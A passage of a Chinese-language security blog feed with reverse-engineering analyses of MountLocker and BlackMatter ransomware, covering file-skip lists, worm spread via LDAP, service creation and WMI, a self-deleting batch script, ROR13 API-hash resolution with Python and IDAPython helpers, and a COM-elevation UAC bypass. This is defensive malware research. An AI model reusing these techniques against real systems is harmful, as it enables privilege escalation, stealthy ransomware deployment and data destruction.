pad.exe&#34;、&#34;QBW32.exe&#34;、&#34;QBW64.exe&#34;、&#34;ipython.exe&#34;、&#34;wpython.exe&#34;、&#34;python.exe&#34;、&#34;dumpcap.exe&#34;、&#34;procmon.exe&#34;、&#34;procmon64.exe&#34;、&#34;procexp.exe&#34;、&#34;procexp64.exe&#34;
</code></pre><p><img src="/mountlocker_images/4202625116554.png" alt=""></p>
<h3 id="加密文件">加密文件</h3>
<p>根据<code>/NOLOCK</code>参数，选择加密函数，默认是执行第一条：</p>
<p><img src="/mountlocker_images/4206518165366.png" alt=""></p>
<p>进入加密功能函数，首先是做驱动器判断：</p>
<p><img src="/mountlocker_images/761020146607.png" alt=""></p>
<h4 id="加密文件列表获取">加密文件列表获取</h4>
<p>扫描文件列表时，将进行文件夹名称和文件名判断，如果文件夹中未包含<code>RecoveryManual.html</code>则创建：</p>
<p><img src="/mountlocker_images/5237357100944.png" alt=""></p>
<p><code>ResultCheckDir</code>文件夹检查，如果满足以下要求，则跳过该文件夹（保留基础服务）：</p>
<p><img src="/mountlocker_images/2884701155729.png" alt=""></p>
<p>查看<code>off_14000A100</code>内容得出<code>black_list</code>文件列表如下：</p>
<pre tabindex="0"><code>&#34;:\\Windows\\&#34;,&#34;:\\System Volume Information\\&#34;,&#34;:\\$RECYCLE.BIN\\&#34;,&#34;:\\SYSTEM.SAV&#34;,&#34;:\\WINNT&#34;,&#34;:\\$WINDOWS.~BT\\&#34;,&#34;:\\Windows.old\\&#34;,&#34;:\\PerfLog\\&#34;,&#34;:\\Boot&#34;,&#34;:\\ProgramData\\Microsoft\\&#34;,&#34;:\\ProgramData\\Packages\\&#34;,&#34;$\\Windows\\&#34;,&#34;$\\System Volume Information\\&#34;,&#34;$\\$RECYCLE.BIN\\&#34;,&#34;$\\SYSTEM.SAV&#34;,&#34;$\\WINNT&#34;,&#34;$\\$WINDOWS.~BT\\&#34;,&#34;$\\Windows.old\\&#34;,&#34;$\\PerfLog\\&#34;,&#34;$\\Boot&#34;,&#34;$\\ProgramData\\Microsoft\\&#34;,&#34;$\\ProgramData\\Packages\\&#34;,&#34;\\WindowsApps\\&#34;,&#34;\\Microsoft\\Windows\\&#34;,&#34;\\Local\\Packages\\&#34;,&#34;\\Windows Defender&#34;,&#34;\\microsoft shared\\&#34;,&#34;\\Google\\Chrome\\&#34;,&#34;\\Mozilla Firefox\\&#34;,&#34;\\Mozilla\\Firefox\\&#34;,&#34;\\Internet Explorer\\&#34;,&#34;\\MicrosoftEdge\\&#34;,&#34;\\Tor Browser\\&#34;,&#34;\\AppData\\Local\\Temp\\&#34;
</code></pre><p>数据文件夹<code>&quot;Program Files&quot;</code>，<code>&quot;Program Files (x86)&quot;</code>，<code>&quot;ProgramData&quot;</code>，<code>&quot;SQL&quot;</code>：</p>
<p><img src="/mountlocker_images/2166505156338.png" alt=""></p>
<p><code>ResultCheckFile</code>文件名检查如下，如果文件小于最小，大于最大，或者是指定后缀名则跳过该文件：</p>
<p><img src="/mountlocker_images/4876024154804.png" alt=""></p>
<p>后缀名检查如下：</p>
<p><img src="/mountlocker_images/5143325151055.png" alt=""></p>
<p>查看数组可知<code>suffix_list</code>如下：</p>
<pre tabindex="0"><code>&#34;exe&#34;,&#34;dll&#34;,&#34;sys&#34;,&#34;msi&#34;,&#34;mui&#34;,&#34;inf&#34;,&#34;cat&#34;,&#34;bat&#34;,&#34;cmd&#34;,&#34;ps1&#34;,&#34;vbs&#34;,&#34;ttf&#34;,&#34;fon&#34;,&#34;lnk&#34;
</code></pre><p>然后扫描文件，以<code>FindFirstFileW</code>和<code>FindNextFileW</code>来查找文件， 循环调用以确保所有文件夹都被扫描到：</p>
<p><img src="/mountlocker_images/1884021169047.png" alt=""></p>
<h4 id="文件加密流程">文件加密流程</h4>
<p>采用多线程启动加密主函数：</p>
<p><img src="/mountlocker_images/2889733164183.png" alt=""></p>
<p>再多线程对目标进行加密：</p>
<p><img src="/mountlocker_images/1930634157729.png" alt=""></p>
<p>将加密文件重命名成固定格式：</p>
<p><img src="/mountlocker_images/708036150863.png" alt=""></p>
<p>加密好密钥，然后将内容写入到文件中：</p>
<p><img src="/mountlocker_images/4889737141393.png" alt=""></p>
<p>接着重新读取文件并加密：</p>
<p><img src="/mountlocker_images/653843143897.png" alt=""></p>
<h3 id="蠕虫攻击">蠕虫攻击</h3>
<p>如果<code>/NETWORK</code>参数不为空，则启动蠕虫攻击：</p>
<p><img src="/mountlocker_images/1950341169370.png" alt=""></p>
<p>蠕虫函数运行前会创建线程，等待事件：</p>
<p><img src="/mountlocker_images/4849842157237.png" alt=""></p>
<p>然后会在域内寻找<code>LDAP</code>服务器：</p>
<p><img src="/mountlocker_images/2093647177403.png" alt=""></p>
<p>当检查存在主机时，添加事件到线程中去：</p>
<p><img src="/mountlocker_images/5563848166627.png" alt=""></p>
<p>事件将链接目标主机，然后进行蠕虫行为：
<img src="/mountlocker_images/5761449162381.png" alt=""></p>
<p>首先会复制自身到<code>C:\\ProgramData</code>目录下：</p>
<p><img src="/mountlocker_images/1250253177865.png" alt=""></p>
<p>根据<code>NetworkFlag</code>的不同，选择不同的方式：</p>
<p><img src="/mountlocker_images/5054254175367.png" alt=""></p>
<p>第一种方式是<code>CreateServiceW</code>：</p>
<p><img src="/mountlocker_images/5240655156608.png" alt=""></p>
<p>第二种方式是<code>WMI</code>（由于技术实力不达标，未看明白函数主体，但从上下文结构和错误提示信息得出方式）：</p>
<p><img src="/mountlocker_images/2959659179048.png" alt=""></p>
<h3 id="自我删除">自我删除</h3>
<p>在蠕虫攻击结束后，退出前的最后一个函数是自我删除函数：</p>
<p><img src="/mountlocker_images/4854100184184.png" alt=""></p>
<p>创建一个<code>bat</code>文件，取消文件系统、只读、隐藏属性，安静模式强制删除文件</p>
<pre tabindex="0"><code>attrib -s -r -h %1
:l
del /F /Q %1
if exist %1 goto l
del %0
</code></pre><p>在最后将利用<code>CreateProcessW</code>删除自身</p>
]]></content>
		</item>
		
		<item>
			<title>BlackMatter</title>
			<link>https://www.a1ee.cn/medium/blackmatter/</link>
			<pubDate>Mon, 18 Oct 2021 16:13:48 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/blackmatter/</guid>
			<description>BlackMatter 勒索软件分析 1. 前言 一个新的勒索软件团伙BlackMatter于 2021 年 7 月在地下论坛/Exploit/和/XSS/上招募附属机构。他们填补了在</description>
			<content type="html"><![CDATA[<h1 id="blackmatter-勒索软件分析">BlackMatter 勒索软件分析</h1>
<h2 id="1-前言">1. 前言</h2>
<p>一个新的勒索软件团伙<code>BlackMatter</code>于 2021 年 7 月在地下论坛<code>/Exploit/</code>和<code>/XSS/</code>上招募附属机构。他们填补了在 Colonial Pipeline 攻击后<code>DarkSide</code>关闭以及<code>REvil</code>在 7 月中旬击败 Kaseya 后消失所留下的空白。该团伙表示：他们既不是<code>DarkSide</code>也不是<code>REvil</code>的继任者。宣称<code>BlackMatter</code>是将勒索软件<code>LockBit</code>、<code>REvil</code>和<code>DarkSide</code>各自的优势结合起来的最好的勒索软件。</p>
<p><strong>IOC</strong></p>
<blockquote>
<p>SHA256 : 22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6</p>
</blockquote>
<p>你可以在<a href="https://bazaar.abuse.ch/sample/22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6/">MalwareBazaar</a>下载。</p>
<p><strong>赎金票据</strong></p>
<p>勒索信的内容在<code>BlackMatter</code>的配置中进行了加密，并动态解密写入到每个目录的勒索信文件中。赎金票据文件名的形式为：<code>**.README.txt</code></p>
<p><img src="/blackmatter_images/2892754090964.png" alt=""></p>
<h2 id="2-动态解析api">2. 动态解析API</h2>
<p>因为结合了诸多勒索软件的优点，那么动态解析API和基本的字符串加密是必不可少的，接下来就让我们来看看它到底是怎么做的。</p>
<p>IDA打开样本，首先便是动态解析API，函数如下：</p>
<p><img src="/blackmatter_images/2754708160965.png" alt=""></p>
<h3 id="21-哈希计算">2.1. 哈希计算</h3>
<p>实际调用是使用<code>Get_Func_Addr_By_ROR13_Hash</code>导入API函数的hash进行函数加载。<code>Get_Func_Addr_By_ROR13_Hash</code>函数中可以看到首先确保<code>LoadLibraryA</code>和<code>GetProcAddress</code>已加载，然后再进行hash比对：</p>
<p><img src="/blackmatter_images/1080120167258.png" alt=""></p>
<p><code>hash</code>计算采用了循环右移<code>0xD</code>位的方式，<code>Get_Dll_Name_Hash</code>函数内容如下：</p>
<p><img src="/blackmatter_images/1502623187424.png" alt=""></p>
<p>采用<code>python</code>代码重写就美观了许多：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">dll_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">each</span> <span class="o">&gt;</span> <span class="mh">0x40</span> <span class="ow">and</span> <span class="n">each</span> <span class="o">&lt;</span> <span class="mh">0x5b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">each</span> <span class="o">=</span> <span class="n">each</span> <span class="o">|</span> <span class="mh">0x20</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span></code></pre></div><p><code>Get_Func_Name_Hash</code>函数略有不同，但大同小异：</p>
<p><img src="/blackmatter_images/1134525180093.png" alt=""></p>
<p><code>python</code>代码如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Calc_Func_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">,</span> <span class="n">func_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">dll_name</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">func_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span></code></pre></div><p><strong>检验代码的有效性</strong></p>
<p>实际上要调用的函数散列可以如下这般进行计算：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;LoadLibraryA&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;GetProcAddress&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
</span></span></code></pre></div><p>返回结果如下：</p>
<pre tabindex="0"><code>0x27d05eb2
0xbb93705c
</code></pre><p>实际上加载<code>LoadLibraryA</code>和<code>GetProcAddress</code>的<code>hash</code>确实如此：</p>
<p><img src="/blackmatter_images/3960033176648.png" alt=""></p>
<h3 id="22-加载函数">2.2. 加载函数</h3>
<p>深入到<code>Resolve_API_Hash</code>函数中去，可以发现其逻辑传入两个地址，第一个地址是加载后函数存放地址，第二个地址是待解密加载的<code>hash</code>，解密密钥也很清晰：<code>0x22065FED</code>，当获取到的地址是<code>0xCCCCCCCC</code>时退出加载循环。</p>
<p><img src="/blackmatter_images/4902326117262.png" alt=""></p>
<p>加载函数前有两个<code>push</code>，通过动态调试可以知道第一个<code>push</code>是加载函数存放起始地址，第二个<code>push</code>是需要解密的函数<code>hash</code>存放起始地址。简单调试后可以得到知道每个<code>dll</code>加载时的<code>hash</code></p>
<p><img src="/blackmatter_images/3452450090969.png" alt=""></p>
<p>可以检索一下所有的本地dll文件，计算hash进行比对，</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">dict</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;.dll&#39;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">dll_hash</span> <span class="o">=</span> <span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dll_name</span> <span class="o">=</span> <span class="n">filename</span>
</span></span><span class="line"><span class="cl">        <span class="nb">dict</span><span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">dll_hash</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">]</span> <span class="o">=</span> <span class="n">filename</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;411677B7:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X411677B7&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;B1FC7F66:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XB1FC7F66&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;BCFA1667:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XBCFA1667&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;7132A177:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X7132A177&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3032403A:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3032403A&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;391830B4:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X391830B4&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;38327FBA:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X38327FBA&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C50C676F:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC50C676F&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;820A18A3:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X820A18A3&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;FD1A17C6:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XFD1A17C6&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;41E8A017:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X41E8A017&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3CFC1737:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3CFC1737&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C3BC5607:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC3BC5607&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;76E87915:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X76E87915&#39;</span><span class="p">])</span>
</span></span></code></pre></div><p>最终计算结果如下：</p>
<pre tabindex="0"><code>411677B7:ntdll.dll
B1FC7F66:kernel32.dll
BCFA1667:advapi32.dll
7132A177:user32.dll
3032403A:gdi32.dll
391830B4:shell32.dll
38327FBA:ole32.dll
C50C676F:shlwapi.dll
820A18A3:oleaut32.dll
FD1A17C6:wtsapi32.dll
41E8A017:RstrtMgr.dll
3CFC1737:netapi32.dll
C3BC5607:activeds.dll
76E87915:wininet.dll
</code></pre><p>查看第二个参数地址可以找到需要进行加载的<code>hash</code>再未进行异或前的<code>hash</code>。
<img src="/blackmatter_images/4401659177428.png" alt=""></p>
<h3 id="23-idapython解密">2.3. IDAPython解密</h3>
<p>根据上面的结论，可以进行简单的逻辑实现：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 传入Resolve_API_Hash函数的的地址</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Resolve_All_APIs</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 获取dll加载函数的交叉引用地址</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="o">.</span><span class="n">CodeRefsTo</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">current_ea</span> <span class="o">=</span> <span class="n">ref</span>
</span></span><span class="line"><span class="cl">        <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 获取上一条汇编语言的地址</span>
</span></span><span class="line"><span class="cl">            <span class="n">prev_instruction_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">current_ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 判断助记符是否为push</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;push&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">api_addr_ea</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># 向上第一条push是api写入地址</span>
</span></span><span class="line"><span class="cl">                    <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># 再向上一条push是apihash存储的地址</span>
</span></span><span class="line"><span class="cl">                    <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_ea</span> <span class="o">=</span> <span class="n">prev_instruction_ea</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">api_addr_ea</span> <span class="o">+=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="n">api_hashes_ea</span> <span class="o">+=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 根据地址获取hash</span>
</span></span><span class="line"><span class="cl">            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_wide_dword</span><span class="p">(</span><span class="n">api_hashes_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">api_hash</span> <span class="o">==</span> <span class="mh">0xCCCCCCCC</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 进行异或解密</span>
</span></span><span class="line"><span class="cl">            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">api_hash</span> <span class="o">^</span> <span class="mh">0x22065FED</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">api_hash</span> <span class="ow">in</span> <span class="n">export_hashes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># 写入地址对应的api函数名</span>
</span></span><span class="line"><span class="cl">                <span class="n">idc</span><span class="o">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">api_addr_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">,</span> <span class="s1">&#39;mw_&#39;</span> <span class="o">+</span> <span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">],</span> <span class="n">idaapi</span><span class="o">.</span><span class="n">SN_CHECK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">api_addr_ea</span><span class="p">),</span><span class="s1">&#39;NOTFOUND&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span></code></pre></div><h2 id="3-bypassuac">3. BypassUAC</h2>
<p>当成功加载<code>dll</code>后，开始检查当前用户的<code>RID</code>是否是<code>administrators</code>:</p>
<p><img src="/blackmatter_images/944715141047.png" alt=""></p>
<p>接着通过对比<code>OSMajorVersion</code>与<code>OSMinorVersion</code>检查操作系统版本：</p>
<p><img src="/blackmatter_images/5467628159473.png" alt=""></p>
<p>从<code>TOKEN_GROUPS</code>中判断进程令牌是否是<code>admin</code>权限。</p>
<p><img src="/blackmatter_images/200218177506.png" alt=""></p>
<p>如果不是<code>admin</code>权限运行，则进行提权，使用<code>LdrEnumerateLoadedModules</code>将<code>C:\\Windows\\System32\\dllhost.exe</code>注入到进程的<code>PEB</code>中，这样可以使用<code>dllhost.exe</code>接管<code>COM</code>对象。</p>
<p><img src="/blackmatter_images/3381612236730.png" alt=""></p>
<p>调用<code>CoGetObject</code>创建以下对象：</p>
<pre tabindex="0"><code>Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
</code></pre><p>通过<code>COM</code>库重载自身，从而达到权限提升的目的，整个<code>BypassUAC</code>过程如下：</p>
<p><img src="/blackmatter_images/5558435232484.png" alt=""></p>
<p>最后再调用<code>NtTerminateProcess</code>终止自身。</p>
<h2 id="4-勒索设备id号生成">4. 勒索设备ID号生成</h2>
<p>获取注册表项<code>SOFTWARE\Microsoft\Cryptography</code>中的<code>MachineGuid</code>，经过三次<code>ror13</code>，再进行字节反转，最后<code>base64</code>编码一次，再将<code>+</code>、<code>/</code>、<code>=</code>符号进行转义，生成勒索设备ID号。</p>
<p><img src="/blackmatter_images/803600179474.png" alt=""></p>
<p>解密出勒索信文件名<code>%s.README.txt</code>：</p>
<p><img src="/blackmatter_images/2694503167341.png" alt=""></p>
<h2 id="5-窃取登录凭证">5. 窃取登录凭证</h2>
<p>接着会尝试使用<code>LogonUserW</code>窃取登录凭证：</p>
<p><img src="/blackmatter_images/843407190176.png" alt=""></p>
<p>然后检查该用户是否属于<code>DOMAINNAME\Domain Admins</code>：</p>
<p><img src="/blackmatter_images/1674812186731.png" alt=""></p>
<h2 id="6-勒索主体">6. 勒索主体</h2>
<p>该功能模块主要是根据不同的命令参数进行功能分化，不同的参数执行不同的功能：</p>
<p><img src="/blackmatter_images/4842829189475.png" alt=""></p>
<h3 id="61-命令参数解析">6.1. 命令参数解析</h3>
<p>可以看到<code>BlackMatter</code>支持以下四个命令参数：</p>
<pre tabindex="0"><code>-path &lt;pwd&gt;      加密&lt;pwd&gt;路径的文件
&lt;pwd&gt;            加密&lt;pwd&gt;路径的文件
-safe            安全模式重启
-wall            设置壁纸
</code></pre><p>由于存储在样本中的是<code>hash</code>，所以只能通过生成明文字典（very luncky），再计算出字符串的<code>hash</code>进行比对，最终确认出明文命令：</p>
<p><img src="/blackmatter_images/5609927141049.png" alt=""></p>
<h3 id="62-指定路径模式">6.2. 指定路径模式</h3>
<p>当使用<code>-path &lt;pwd&gt;</code>或<code>&lt;pwd&gt;</code>参数时，将创建<code>I/O</code>接口进行加密，然后再重写生成加密文件。</p>
<p>当<code>-path &lt;pwd&gt;</code>中的<code>&lt;pwd&gt;</code>是服务器路径时，将检索共享资源进行加密：</p>
<p><img src="/blackmatter_images/2045041219475.png" alt=""></p>
<p>如果<code>-path &lt;pwd&gt;</code>中的<code>&lt;pwd&gt;</code>是文件路径，或仅使用<code>&lt;pwd&gt;</code>参数，则直接加密目录文件：</p>
<p><img src="/blackmatter_images/4241043227508.png" alt=""></p>
<h3 id="63-安全模式">6.3. 安全模式</h3>
<p>当使用<code>-safe</code>参数时，<code>BlackMatter</code>会首先检测是否是<code>RID</code>是否属于<code>BUILTIN\Administrators</code>，如果是，则进行以下操作。</p>
<p><img src="/blackmatter_images/3313706126733.png" alt=""></p>
<h4 id="631-创建自登录账户">6.3.1. 创建自登录账户</h4>
<p>随机生成一个12位的密码：由3个随机大写字母、1个随机字符（<code>#</code>或<code>&amp;</code>）、3个随机数字、1个随机字符（<code>#</code>或<code>&amp;</code>）、4个随机小写字母组成。然后使用<code>NetUserSetInfo</code>创建<code>administrator</code>，密码则是刚才生成的12位字符串。</p>
<p><img src="/blackmatter_images/4580448107343.png" alt=""></p>
